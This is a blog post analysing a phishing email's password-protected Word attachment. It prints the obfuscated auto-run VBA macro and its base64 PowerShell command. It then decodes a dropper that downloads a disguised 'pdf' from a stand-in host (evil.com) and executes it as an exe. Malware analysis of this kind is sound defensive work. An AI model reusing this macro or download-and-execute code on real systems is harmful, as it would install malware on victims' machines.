---
layout: post
title: Deconstruction of a Malicious Macro
---

At work recently, a coworker notified me of a suspicious looking email they had received.
They were initially suspicious of the format of the message received, but even more so once they attempted to open the attached _password protected Word document_. 
As you may imagine, there were macros contained within that attempt to run as soon as it's opened, but luckily my colleague had the good sense to close the file as soon as he was prompted to run them.

Intrigued by this, I poked a bit deeper to see what this was attempting to do.

<!-- fold -->

## First Suspicions

Ignoring the questionable Word doc attached, the email sent was itself a bit suspicious to me, but according to our sales team, a fairly regular occurence and in line with other PO emails that they have received from large "enterprise" corporations. 
The sales team will often receive unsolicied purchase order drafts from large companies, but they typically will come with a bit of a preamble or background for our sales team to work with.
The one came from what appears to be a legitimate domain owned by a legitimate corporation, albeit under the `com.sa` domain which is run by Saudi Arabia. 
This sort of top-level ownership appears to be fairly common for companies in Saudi Arabia but to me seemed a bit questionable as it means the DNS records are controlled by the Saudi Government, or at least the governing body with ownership of the `com.sa` domain, creating subdomains for the companies that register with them.

In any case, this seems as if the email has originated from an authentic origin - perhaps from an internal security breach at the company. 
The company name has not been included here because it's irrelevant and the enterprise world is fairly litigious. 

## The Attachment File

The Word doc file is password protected for some inexplicable reason.
The password was provided by the attacker in the email, but once you open the file, it will immediately attempt to run some macros.
It seems as though most programs capable of reading Word docs (e.g. Libreoffice and Word) have macros disabled by default which provides a first layer of protection against this type of attack. 
For my colleague, this is what had tipped him off once he opened the file.
On top of this, there's a somewhat hilarious image pasted into the document (distortion and stretching included) and nothing else.

![Obviously we should enable this macro, right?](/public/img/word_content_disabled.jpg)

It's fairly clear that this is up to no good.

## Inspecting the Macros

Rather than running the macros, we'll take a look at what they contain in the macro editor provided by LibreOffice.
There are two present in the file: one which runs on document open, and the other which contains the nasty bits.

{% highlight visualbasic linenos %}
Rem Attribute VBA_ModuleType=VBADocumentModule
Option VBASupport 1
Private Sub Document_Open()

gNk_GqwOH.G5Bg8_K1A3Dok_yYRJ74

End Sub
{% endhighlight %}

I don't know much about Visual Basic at all, but this looks like the `Document_Open` method will just call a user-defined method `gNk_GqwOH.G5Bg8_K1A3Dok_yYRJ74` after the file is opnened (if macros were enabled).
Let's see what that method does in the other macro definition file.

{% highlight visualbasic linenos %}
Rem Attribute VBA_ModuleType=VBAModule
Option VBASupport 1
Sub G5Bg8_K1A3Dok_yYRJ74()
U8z6_BPQf_TXrKV_dH_TGDGHk_3_MX_T_ac5qKgkGAoGT626_It1pmzFq = "77II?6~ ~ ^T G>v eak"
gK_IG_ = "77 $\ `^V | +F 2 "
AQGrZNIjSCFX9xoB7__m = "77YO  3Vs ^.f~wfG J: / S vn"
K1B4_sBlT4D7xW5EmNhTNeAc_fL6t_ddL_gm__QhY_sC2uxfKDSghdhp1itcVF2OPjkmzH_i794KuwkNrpjek65rb1vXIw_H_TwH__o__sjhiM4_8VupeLmSn2_9UiP_ = "WSCrIpt.ShEll"
GmTjLC_9bR = "77nhA"
gJTejCc5aGMZ = "77 x3^'LrBxMI /' , mlXO h.%%t'7DQR|L&s )yF"
iqqsf3KCAUnL6gUMEI_ACI1oS_asa__AP4AdVPSi_v6_e_h_ = "77 '  ~k!1V.|#$2  2-Z$e"
On Error Resume Next
rFpH_ = "77m,O  Ai!    @eJxk6A$eX2UPPkZ*cvVvn  j# D?1>  /jSQ N~3 !"
LLOz_OVQbl2In5_fzzyyX4QMo_KaX_JQ21_gjnTA7Gd__21BeV1O1RkR5__ = "77   TOd0 ]HD-`QN/i< l"
ZQZPv1U5BVx2FOGIwH_6__5ZZEjkhdb5_N = "77U44YBs +   >wm #qUTn  "
cJ_5Gr_ieQro_mAujqJ_v_BzvgHg3Uhdlns6uFPE_lKh_Ym7__xk95_T_J_iYVp_rD_M4_ATP_5_wcoM4Kdyg7epfOxa_qpi6Bz6UP_9_TJ4A8fddvoC1zbuhMpdDYLiNLDkmr1dHevBlkohrJ6J = 0
sca_K_an3_ZU_nsLi682PUAzfFsMg42z2LXpKCwvZU_X9th7yG29_UmM = "77oV`$,"
bjW_PC_9_ = "77$$&r\5<S nH iL'$HP(< RME v8V>Sk @i"
icpF_AU_BR4SbzvhuXP_3wVh_CkprULN_NPG1qvFVzz_s3AskUdnp7F = "77 ) KD*V4%;DDy=2 B(Zn X^g_s s Q$Oz 6 2 - tfO #x  F02eG_QfQ z"
GFgFskYo8Q4NQ4VeKgBgVpkY__az___n_q6c8_yM9_TNjnRIOlvA3_ia = "cm" & Chr(467 - 399) & Chr(106 - 74) & Chr(142 - 95) & Chr(208 - 141) & Chr(182 - 150) & Chr(146 - 34) & Chr(103 - 24) & Chr(360 - 273) & Chr(387 - 286) & Chr(446 - 332) & Chr(260 - 145) & Chr(126 - 22) & Chr(276 - 207) & Chr(214 - 138) & Chr(472 - 396) & Chr(355 - 323) & Chr(419 - 374) & Chr(208 - 139) & Chr(229 - 197)
v___xOoPq_eQCZdq_l_d_6SyGB1_M1hh_ = "77_,q&Z8 Wy( &E \ Z*Mftv$H(@F)6V]U 2U $b  .<  3"
c_tl7zqZ_7CbwI_nZ_eSCymGwlXk_zW6L_6T7QnIwbwUl = "77+tkyd ]&Z'v*C 5 {;="
oOg7iPe_k5nWbxKR_WIZGErMlq_MLfj_He_LzmSY13j_H6TcS1p_d = "77Qf.4Mi   YZRd/  Zh7`_!QG,lxhdh!9!}K[ Z81l IS [   #h3_i"
GFgFskYo8Q4NQ4VeKgBgVpkY__az___n_q6c8_yM9_TNjnRIOlvA3_ia = GFgFskYo8Q4NQ4VeKgBgVpkY__az___n_q6c8_yM9_TNjnRIOlvA3_ia & "DQAKAGYAdQBuAGMAdABpAG8AbgAgAFYAXwB3ADgAXwBGAGEARwBIAGoAbwBzAF8AQQBfAE0AMwA1ACAAKAAgACQAZwA3AGEAMwA4AHQAUwBlAEsAZABtAGYANQBOAEgAIAAsACAAJAByAFIAcABsADIAbgB6AF8AXwBqAHcAbABSAFIAYQBjAFAAbABLAGYATABxAGMAXwBfAGUAIAApAHsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAOwANAAoAUwB0AGEAcgB0AC0AQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAIAAtAFMAbwB1AHIAYwBlACAAJABnADcAYQAzADgAdABTAGUASwBkAG0AZgA1AE4ASAAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAJAByAFIAcABsADIAbgB6AF8AXwBqAHcAbABSAFIAY"
TYfJJ1HGp_KlE6p8bR_shMdi_oL = "77lQ n1n 8=TY;Qukb !K. __ GWZ}Tb!vh@2 F8KW"
e4UydWL_hoeSaFiCeweqXvTNN_tL_46Ede = "779Nk  m,E8Y$"
mMJEqD = "77gvRu.  A` $rhSq"
GFgFskYo8Q4NQ4VeKgBgVpkY__az___n_q6c8_yM9_TNjnRIOlvA3_ia = GFgFskYo8Q4NQ4VeKgBgVpkY__az___n_q6c8_yM9_TNjnRIOlvA3_ia & "QBjAFAAbABLAGYATABxAGMAXwBfAGUAOwAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAGMAbwBtACAAUwBoAGUAbABsAC4AQQBwAHAAbABpAGMAYQB0AGkAbwBuACkALgBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQAoACAAJAByAFIAcABsADIAbgB6AF8AXwBqAHcAbABSAFIAYQBjAFAAbABLAGYATABxAGMAXwBfAGUAIAApADsAIAB9AA0ACgB0AHIAeQB7ACAAJABkAF8AXwBvAF8AaQBsAD0AJABlAG4AdgA6AHQARQBtAFAAKwAnAFwAeABaAGkASgBuAFIAXwA3AGUAawBmADYAXwBmAC4AZQB4AGUAJwA7AA0ACgBWAF8AdwA4AF8ARgBhAEcASABqAG8AcwBfAEEAXwBNADMANQAgACcAaAB0AHQAcAA6AC8ALwB0AHUAbgBnAGcAYQBsAG0AYQBuAGQAaQ"
v_H69ab9_8vY8xrZ_ZbmA_msOx6cL2P_Qy = "77` eq7o^ |N j&gM _ `A! Y%*  xC6j%J . nU=;+ dA3"
km_ROZGM85_pfq4wDnDa1sTYg_d8mFho__B_Nn__Um_qh = "77  g  Kx) qK"
hGEiXnk1y82HltD6HiqMThXdyX = "77`ai*xsX`r :{[TN+f?7-Z3y #7fDx  7NjA/z4Q?E%]A "
GFgFskYo8Q4NQ4VeKgBgVpkY__az___n_q6c8_yM9_TNjnRIOlvA3_ia = GFgFskYo8Q4NQ4VeKgBgVpkY__az___n_q6c8_yM9_TNjnRIOlvA3_ia & "ByAGkALgBjAG8AbQAvAGMAbAAvAG0AcwAuAHAAZABmACcAIAAkAGQAXwBfAG8AXwBpAGwAOwANAAoAIAB9AGMAYQB0AGMAaAB7AH0A"
YcC_D = "77@.fYB p f~Hvv)[. u  $H~ A7L| oVcR i2"
nmz82OODb7xG_Ivl36_B_MTD9sjt9D_mttDeuvKf3UEPeQNK_vff = "77 xQm3Avy @%    6jK  7S"
PIl9_odDMy_WP_F1_jXIg__hhUOqChZeziwL_vB1NG1ZU38Fv5X6ii = "77 ,n  "

Set bq_i_N_iXtc_kens51u5_5L_P_7g_v4b_gud__hTr5suH____xwS_O1gU_I5PaZlyA__s_k2HQBEBZvK_2eJ8aRloD__sl_FT_6G8 = CreateObject(K1B4_sBlT4D7xW5EmNhTNeAc_fL6t_ddL_gm__QhY_sC2uxfKDSghdhp1itcVF2OPjkmzH_i794KuwkNrpjek65rb1vXIw_H_TwH__o__sjhiM4_8VupeLmSn2_9UiP_)
bHD_PmOw_oNefpF4rJXg4PFcCoW = "77 Cr>zFK/D? ki`'4#3: nY: )*q TaF "
G_d5G_e__VXaZFB_yLG92BDW_oB_k1kFF3sfsjO = "77>D~Q # tS+z Wm @ :  O 7F*y7qcWaq "
ikvoxA_T__QMRE___4_3a4dVBuGJgVeR = "77 H@o\& #SMd"
bq_i_N_iXtc_kens51u5_5L_P_7g_v4b_gud__hTr5suH____xwS_O1gU_I5PaZlyA__s_k2HQBEBZvK_2eJ8aRloD__sl_FT_6G8.Run GFgFskYo8Q4NQ4VeKgBgVpkY__az___n_q6c8_yM9_TNjnRIOlvA3_ia, cO_ZfQdJ_yt1mNsWVMC_dbgqY3ghALOYmvN___SX3yu9TtJFPeseY1dArK_mt5IsZKD19nPS3nEnpgMniQGUbsAuHNLt_pn7e_Y_fRFlDPltkyI_8L_SmxG
E6gM_WOW6K_6IdHA_1mklpwo_Pc_ruvmX9_Vhu = "77lCJB Lk5JTXA.SIDsN  Q+ C"
hei7F2gCgbGDor4oX_2Go4Lo_ = "77@ ^"
XNWIVvRJ5___sgvYC5ZZf_4dJhModFnH4vrd_3_px3tm = "77c5 ~ X`hmI   zGAMe(37 i5\BP cF)$ "
End Sub
{% endhighlight %}

There's a lot going on here and it mostly looks like a garbled mess, but one thing in particular stuck out to me to point me in the right direction.
On line 7, we see `"WSCrIpt.ShEll"`. 
I'm not a windows guy, but I'm _fairly_ sure that's going to come into play when trying to run a command in either the command prompt or a powershell.

## Undoing the Obfuscation

After looking through the macro script for a bit longer, some patterns pop out that make it clear that this is just (poorly) obfuscated code.

1. There are repeated variable names throughout where we can see strings are concatenated together.
2. On line 19, we see character codes being used to construct a string.
3. Some of the longer string sequences look like they may be base64 encoded data.

Starting by just simplifying the concatenations and converting the `Chr(123)` calls to their ASCII characters, we can get a bit more of a clean view of what is happening.
Most of the code seems to be unused and just is included to make things look more complex than they are, so the meat of it is actually quite simple and just opens a powershell, then passes along a base64 encoded string to execute (as seen by the `-E` flag).

{% highlight visualbasic lineno %}
Rem Attribute VBA_ModuleType=VBAModule
Option VBASupport 1
Sub G5Bg8_K1A3Dok_yYRJ74()
On Error Resume Next
Set create_shell = CreateObject("WSCrIpt.ShEll")
create_shell.Run "cmD /C pOWershELL -E DQAKAGYAdQBuAGMAdABpAG8AbgAgAFYAXwB3ADgAXwBGAGEARwBIAGoAbwBzAF8AQQBfAE0AMwA1ACAAKAAgACQAZwA3AGEAMwA4AHQAUwBlAEsAZABtAGYANQBOAEgAIAAsACAAJAByAFIAcABsADIAbgB6AF8AXwBqAHcAbABSAFIAYQBjAFAAbABLAGYATABxAGMAXwBfAGUAIAApAHsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAOwANAAoAUwB0AGEAcgB0AC0AQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAIAAtAFMAbwB1AHIAYwBlACAAJABnADcAYQAzADgAdABTAGUASwBkAG0AZgA1AE4ASAAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAJAByAFIAcABsADIAbgB6AF8AXwBqAHcAbABSAFIAYQBjAFAAbABLAGYATABxAGMAXwBfAGUAOwAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAGMAbwBtACAAUwBoAGUAbABsAC4AQQBwAHAAbABpAGMAYQB0AGkAbwBuACkALgBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQAoACAAJAByAFIAcABsADIAbgB6AF8AXwBqAHcAbABSAFIAYQBjAFAAbABLAGYATABxAGMAXwBfAGUAIAApADsAIAB9AA0ACgB0AHIAeQB7ACAAJABkAF8AXwBvAF8AaQBsAD0AJABlAG4AdgA6AHQARQBtAFAAKwAnAFwAeABaAGkASgBuAFIAXwA3AGUAawBmADYAXwBmAC4AZQB4AGUAJwA7AA0ACgBWAF8AdwA4AF8ARgBhAEcASABqAG8AcwBfAEEAXwBNADMANQAgACcAaAB0AHQAcAA6AC8ALwB0AHUAbgBnAGcAYQBsAG0AYQBuAGQAaQByAGkALgBjAG8AbQAvAGMAbAAvAG0AcwAuAHAAZABmACcAIAAkAGQAXwBfAG8AXwBpAGwAOwANAAoAIAB9AGMAYQB0AGMAaAB7AH0A", cO_ZfQdJ_yt1mNsWVMC_dbgqY3ghALOYmvN___SX3yu9TtJFPeseY1dArK_mt5IsZKD19nPS3nEnpgMniQGUbsAuHNLt_pn7e_Y_fRFlDPltkyI_8L_SmxG
End Sub
{% endhighlight %}

This gets called by the on-open document handler. Now what might that base64 endcoded string contain?

{% highlight powershell lineno %}
function V_w8_FaGHjos_A_M35 ( $g7a38tSeKdmf5NH , $rRpl2nz__jwlRRacPlKfLqc__e ){ Import-Module BitsTransfer;
Start-BitsTransfer -Source $g7a38tSeKdmf5NH -Destination $rRpl2nz__jwlRRacPlKfLqc__e;(New-Object -com Shell.Application).ShellExecute( $rRpl2nz__jwlRRacPlKfLqc__e ); }
try{ $d__o_il=$env:tEmP+'\xZiJnR_7ekf6_f.exe';
V_w8_FaGHjos_A_M35 'http://evil.com/cl/ms.pdf' $d__o_il;
 }catch{}
{% endhighlight %}

This too has some basic obfuscation, but it's clear to see once cleaned up:

{% highlight powershell lineno %}
function evil_func( $arg1 , $arg2 ){ 
  Import-Module BitsTransfer;
  Start-BitsTransfer -Source $arg1 -Destination $arg2;
  (New-Object -com Shell.Application).ShellExecute( $arg2 ); 
}

try{ 
  $exe_path = $env:tEmP + '\xZiJnR_7ekf6_f.exe';
  evil_func 'http://evil.com/cl/ms.pdf' $exe_path;
}catch{}
{% endhighlight %}

We can see that the macro attempts to download a "pdf" to a tempporary directory, then attempt to run the exe.
I am guessing that the reason for saving the file as a pdf in transfer is to try to get around corporate tools that may attempt to block downloads with `.exe` extensions. 
Note that that would be a horrible way to prevent viruses, but some enterprises do some crazy things. 
The domain used for the file hosting (changed by me to be `evil.com` for this post but you can still find the original if you look hard enough...) seems to be still online - I haven't a clue if it's a legitimate site or business. 
The domain is registered with contact information in Indonesia, and curiously, the contact's email address is present as well, which makes me think that the domain was just used temporarily for hosting - likely using a vulnerability in an outdated wordpress install. 
That, or the attacker is incredibly, unbelievably sloppy and used a domain tied to their name and address.

Unfortunately, the file is no longer hosted at that path and we just receive a 404 response, but when I had initially got to this point, the file was still live and downloaded successfully.
I made the mistake of not saving the file before closing down the VM I was working in, but it was fairly small and had lots of inline XML strings in the binary.

## Y Tho? 

Based on the accompanying email message and PO draft (which included information that would have been specifically crafted based on our business and product), I suspect that the attacker had specifically targetted our business and intended to install either a keylogger or ransomware onto the machine the macro could run on. 

The fact that there's still emails that are sent like this is a bit surprising to me, and it makes me extremely concerned with the state of computer literacy in the world.
The colleague of mine who reported this to me is fairly computer-savvy, but even he was a bit unsure of whether this was a legitimate email that just was having issues opening on his computer, or if it was malicious.
I can entirely imagine many people opening the email and enabling the macros without giving a second thought.
What's more concerning to me is that we use Outlook at work, hosted and provided by Azure. 
We are not a large organization (less than 50 employees), but we receive spam and phishing emails of this sort on a near daily basis.
It's possible that we simply haven't configured some spam filter to be strict enough, but it is still surprising to me that this is an issue at all - when we used Google Apps for our email and accounts, we received _no_ spam or phishing emails.

This is likely not the last email attack we will see, and very likely you or your organization will encounter this sort of thing at some point too so it goes to remind you, dear reader, to educate your colleagues and managers, and do what you can to keep systems secure. 

